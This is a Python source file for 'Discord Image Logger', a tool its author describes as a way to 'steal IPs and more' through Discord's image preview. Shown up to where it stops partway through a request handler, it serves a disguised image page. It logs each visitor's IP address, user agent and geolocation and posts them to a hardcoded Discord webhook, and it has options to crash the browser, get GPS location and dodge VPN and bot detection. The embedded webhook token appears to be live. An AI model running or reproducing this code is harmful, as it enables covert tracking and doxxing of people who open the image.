# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discordapp.com/api/webhooks/1405924567872176128/2EC2MvHg387ShTDmjqIxwbFkE5jdoBjQx4j3rG4zoUJPAtIwXc9dkXKkIb2V4NggGn8R",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

